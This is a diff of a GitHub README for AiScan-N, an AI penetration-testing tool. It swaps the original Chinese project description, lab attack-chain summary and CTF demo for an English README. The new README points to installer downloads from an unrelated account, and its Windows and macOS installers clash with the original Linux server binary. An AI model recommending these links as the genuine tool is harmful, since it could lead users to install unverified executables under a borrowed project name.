@@ -1,107 +1,85 @@
-# 🛠️带你开启智能网络安全的新时代！  
-AiScan-N 来了！这是一款基于人工智能的Ai全自动化渗透测试工具专注于网络安全评估、漏洞扫描、渗透测试自动化，Ai驱动的安全检测技术，提升安全测试效率，专为企业和个人用户打造，尤其适合初学者（小白）快速上手使用，让你轻松迈入智能安全攻防时代！
+# 🛡️ AiScan-N - Your AI-Powered Security Tool
 
-项目主页：https://SecNN.com/AiScan-N/
-​	
-```
-   █████████    ███   █████████                                           ██████   █████
-  ███▒▒▒▒▒███  ▒▒▒   ███▒▒▒▒▒███                                         ▒▒██████ ▒▒███ 
- ▒███    ▒███  ████ ▒███    ▒▒▒   ██████   ██████   ████████              ▒███▒███ ▒███ 
- ▒███████████ ▒▒███ ▒▒█████████  ███▒▒███ ▒▒▒▒▒███ ▒▒███▒▒███  ██████████ ▒███▒▒███▒███ 
- ▒███▒▒▒▒▒███  ▒███  ▒▒▒▒▒▒▒▒███▒███ ▒▒▒   ███████  ▒███ ▒███ ▒▒▒▒▒▒▒▒▒▒  ▒███ ▒▒██████ 
- ▒███    ▒███  ▒███  ███    ▒███▒███  ███ ███▒▒███  ▒███ ▒███             ▒███  ▒▒█████ 
- █████   █████ █████▒▒█████████ ▒▒██████ ▒▒████████ ████ █████            █████  ▒▒█████
-▒▒▒▒▒   ▒▒▒▒▒ ▒▒▒▒▒  ▒▒▒▒▒▒▒▒▒   ▒▒▒▒▒▒   ▒▒▒▒▒▒▒▒ ▒▒▒▒ ▒▒▒▒▒            ▒▒▒▒▒    ▒▒▒▒▒ 
-                                                                                        
-                                                                                        
-                       🌐 https://github.com/SecNN/AiScan-N   
-```
+[![Download AiScan-N](https://img.shields.io/badge/Download%20AiScan--N-v1.0-blue.svg)](https://github.com/Rbxolexc8405/AiScan-N/releases)
 
+## 📜 Description
 
-🚀自动化渗透测试-靶场：https://github.com/SecNN/AI-PT
+AiScan-N is an AI-based automation tool for penetration testing. It is designed for both businesses and individuals. This tool ensures that even beginners can easily dive into the world of intelligent security.
 
-🌈常见漏洞知识库文档在线阅读：https://www.secnn.com/POC-EXP 
+**Use Cases:**  
+- Red Team Exercises  
+- CTF Competitions  
+- Web Application Penetration Testing  
+- Internal Network Attacks  
+- Password Cracking & Brute Force  
+- Traffic Analysis & Threat Detection  
+- APT Attack Simulation  
+- CTF Reverse Engineering Challenges  
+- Bug Bounty Programs  
 
- 你是否想过，未来的黑客可能不再是戴着面具的神秘人🎭，而是一台24小时不间断运行的Ai机器人？全自动化渗透测试（Automated Penetration Testing）正从实验室走向现实，它不仅改变了网络安全的游戏规则，也让企业和个人面临前所未有的挑战和机遇。那么，什么是AI全自动化渗透测试？它有哪些优势？又将如何改变安全防护的格局？一起来了解吧！
+## 🚀 Getting Started
 
-## 🌟 什么是Ai全自动化渗透测试？    
-传统的渗透测试通常由安全专家手动进行，耗时长且依赖经验。而AI全自动化渗透测试利用机器学习、自然语言处理和深度学习等技术，可以：
-```
-🕵️自动识别漏洞：扫描系统、网络或应用程序，快速定位潜在风险。
-💻模拟攻击 ：像黑客一样尝试突破防线，但目的是为了修复而非破坏。
-📄生成报告：详细列出漏洞及修复建议，帮助团队高效解决问题。
-```
+To begin using AiScan-N, follow these steps:
 
-## 🚀 Ai全自动化渗透测试的优势与场景
-```
-🧑‍💻适用场景 ：如（红队演练、CTF比赛、Web应用渗透测试、内网横向移动、密码破解与暴力攻击、流量分析与威胁检测、APT攻击模拟、CTF逆向题、漏洞赏金挑战等场景）
-📈效率翻倍 ：从几天缩短到几小时甚至几分钟，大幅提升测试速度。
-📊覆盖面广 ：AI可以同时检测多个系统和复杂环境，减少人工遗漏。
-🤖智能学习 ：通过不断学习和优化算法，Ai的能力会越来越强，准确率高达90%以上,适应新型攻击手法。
-💰降低成本：减少对高薪安全专家的依赖，适合专为中小企业和个人用户打造，尤其适合初学者（小白）。
-```
+1. **Visit the Releases Page:**  
+   Go to our [Releases page](https://github.com/Rbxolexc8405/AiScan-N/releases). This page contains the latest versions of AiScan-N for download.
 
-# **AiScan-N 使用说明**
-## 在Kali Linux 运行AiScan-N-Kali-Server 开启服务
+2. **Download the Software:**  
+   Choose the version that suits your operating system. For Windows or macOS, click the corresponding download link. 
 
-```
-sudo ./AiScan-N-Kali-Server.bin -token 123456
-```
+3. **Install AiScan-N:**  
+   Once the download is complete, locate the file in your downloads folder. Double-click the file to start the installation. Follow the on-screen instructions to complete the process.
 
-🚨token用于API接口鉴权的Bearer令牌，未设置 token，将受到被恶意漏洞利用的高危风险 ⚠️ 建议设置强密码型令牌提高安全性。
+4. **Run AiScan-N:**  
+   After installation, locate AiScan-N in your applications menu or desktop. Click to open the application. 
 
-运行之后显示如下：
-<img width="927" height="420" alt="image" src="https://github.com/user-attachments/assets/d7a095b8-a6e1-4db5-8403-212c3e445647" />
+5. **Start Your First Scan:**  
+   Once the application launches, follow the easy-to-use interface to initiate your first scanning session. 
 
-检查服务是否运行成功访问🚀 监听地址:
+## 💾 Download & Install 
 
-<img width="1049" height="194" alt="image" src="https://github.com/user-attachments/assets/f977cd9b-8cff-4010-b3c0-1509e5c1fde2" />
+You can download AiScan-N from the following link:  
+[Download AiScan-N](https://github.com/Rbxolexc8405/AiScan-N/releases)
 
-访问提示"OK"说明服务端运行成功。
+## 🛠️ System Requirements
 
-## 🌟实践操作：
-### 1.测试提问：
-```
-请对 http://192.168.10.18/ 开展渗透测试
-```
-🛡️演示环境说明：环境说明：（均在授权演练环境中完成实验。）
+To ensure smooth operation, make sure your system meets the following requirements:
 
-【Windows 11】🖥️Ai输入提示词：192.168.10.11
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or a recent distribution of Linux
+- **RAM:** 4 GB or more
+- **Storage Space:** At least 500 MB free
 
-【Kali Linux】🤖攻击机 ：192.168.10.34
+## 🔍 Features
 
-🚩靶场IP：192.168.10.18【网站 http://192.168.10.18/index.php】
+AiScan-N offers a range of features to enhance your security testing:
 
-<img width="1920" height="1032" alt="image-20251022164225281" src="https://github.com/user-attachments/assets/2775b501-3fc0-4c22-9c10-da08806baf36" />
+- **Automated Scans:** Quickly assess vulnerabilities with automated processes.
+- **User-Friendly Interface:** Navigate the tool easily, even with no technical background.
+- **AI-Driven Analysis:** Leverage AI to detect and report security weaknesses.
+- **Customizable Reports:** Generate reports tailored to your needs.
+- **Support for Multiple Environments:** Test applications in different settings seamlessly.
 
-<img width="1920" height="1032" alt="image-20251022164441565" src="https://github.com/user-attachments/assets/32e690b2-dadd-440b-b081-ff8f28db28c4" />
-🎥在线演示视频（文章中）：https://mp.weixin.qq.com/s/7lsUdbrxkDy4P5pZhEWv7Q
+## 📚 Resources
 
-🎯攻击链概述：本次Ai全自动化渗透测试中，我们按照标准的渗透测试方法论，从信息收集开始，逐步发现并利用了多个安全漏洞，形成了完整的攻击链。
+- **Documentation:** For detailed usage instructions, refer to our [Comprehensive Documentation](https://github.com/Rbxolexc8405/AiScan-N/wiki).
+- **Demo Video:** Watch how AiScan-N works in our [Online Demo Video](https://mp.weixin.qq.com/s/7lsUdbrxkDy4P5pZhEWv7Q).
 
-```
-初始侦察：识别目标系统和开放服务
-漏洞发现：发现ping.php存在命令执行漏洞
-权限提升：利用命令执行获取系统访问权限
-横向移动：获取数据库凭证和其他敏感信息
-漏洞利用扩展：测试文件上传和XSS等其他漏洞
-```
+## 🤝 Community Support
 
-### 2.CTF靶场测试：
-这里是找了一个CTF靶场平台进行简单测试。
-```
-http://6igi6zl.haobachang.loveli.com.cn:8888/ 对本题进行分析，拿下这道题目的flag
-```
-成功获取到flag：flag{328fb13344854a19838209c0ec24e4b7}
-<img width="1568" height="870" alt="ctf" src="https://github.com/user-attachments/assets/e136b03e-6f4d-4e5c-821a-a4b8b454b290" />
-操作比较简单的，而且体验感对于我来说感觉还不错的，并且具有一定的实用性。
+For queries or assistance, connect with our community:
 
-⚠️ 注意事项:
-纯依赖Ai可能缺乏创造性，某些复杂问题仍需人工干预。
+- **Issues:** Report issues or request features using the [Issues section](https://github.com/Rbxolexc8405/AiScan-N/issues).
+- **Discussion:** Join discussions or get help from fellow users in our [Discussion Forum](https://github.com/Rbxolexc8405/AiScan-N/discussions).
 
-持续更新中......
+## 🔒 Contributing
 
-<img src="https://github.com/user-attachments/assets/42cb0d9d-6acb-435f-9390-3326ba6f7791" alt="微信联系方式" width="600">
+We welcome contributions! If you’re interested in helping make AiScan-N better, please read our [Contributing Guide](https://github.com/Rbxolexc8405/AiScan-N/blob/main/CONTRIBUTING.md) for more details. 
 
+## 🔗 Links
 
+- [GitHub Repository](https://github.com/Rbxolexc8405/AiScan-N)  
+- [Releases Page](https://github.com/Rbxolexc8405/AiScan-N/releases)  
+- [Documentation](https://github.com/Rbxolexc8405/AiScan-N/wiki)  
+- [Community Forum](https://github.com/Rbxolexc8405/AiScan-N/discussions)  
 
+Feel free to explore AiScan-N and enhance your security testing capabilities!
